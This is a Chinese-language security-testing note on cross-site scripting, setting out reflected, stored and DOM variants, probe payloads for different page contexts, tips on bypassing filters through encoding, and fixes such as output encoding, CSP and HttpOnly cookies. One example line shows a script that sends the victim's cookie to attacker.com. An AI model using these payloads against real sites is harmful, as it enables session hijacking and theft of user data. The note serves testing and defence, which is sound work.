---
type: note
tags: [安全测试] [Web安全]
created: 2026-09-05
updated: 2026-09-05
source: Test-测试常用技能经验总结-原文
---

# XSS 跨站脚本攻击测试

> 📌 来源：[[Test-测试经验总结-原文]] ｜ 安全测试章-XSS 小节

攻击者将恶意 JavaScript 代码注入到网页中，当其他用户浏览该页面时，浏览器执行恶意脚本，导致 Cookie 窃取、会话劫持或钓鱼。

> **测试详解与示例：**
> 
> 

|类型|触发条件|测试 Payload 示例|
|---|---|---|
|反射型|输入内容直接回显在当前页面 URL/响应中|`<script>alert(document.domain)</script>`|
|存储型|输入内容被持久化到数据库，他人访问时触发|`<img src=x onerror=alert(1)>`|
|DOM 型|前端 JS 从 DOM/URL 读取数据并动态写入页面|`javascript:alert(1)` \(在 href/src 中\)|

- **测试步骤：**

    - 找到所有用户可控输入点（搜索框、评论区、个人资料、URL 参数）。

    - 输入基础探测 Payload：`<test>"'<test>`，观察响应中是否被原样输出。

    - 根据输出位置调整 Payload：

        - HTML 标签内：`"><svg/onload=alert(1)>`

        - JS 字符串内：`';alert(1);//`

        - 属性值内：`" onfocus=alert(1) autofocus="`

    - 检查 WAF/过滤规则，尝试编码绕过（HTML 实体、Unicode、大小写混合）。

- **修复建议： **输出时进行上下文相关的 HTML 编码；设置 `Content-Security-Policy`；HttpOnly Cookie。

---

> **以最常见的反射型 XSS 为例：**
> 
> 

1. 寻找注入点：一个搜索页面，URL 为`https://example.com/search?q=test`，页面会显示“您搜索的关键词是：test”。

2. 注入脚本：将参数`q`修改为一段 JavaScript 代码，如`<script>alert('XSS')</script>`。

3. 观察响应：

    - 存在漏洞：如果页面弹出了`XSS`警告框，说明输入的代码被浏览器执行了。

    - 利用方式：真正的攻击脚本可能是`<script>document.location='``http://attacker.com/steal?cookie='+document.cookie</script>`，用于窃取用户的 Cookie。

---

## 相关笔记
- [[02-测试技能]]
- [[CSRF跨站请求伪造测试]]
- [[SQL注入测试]]
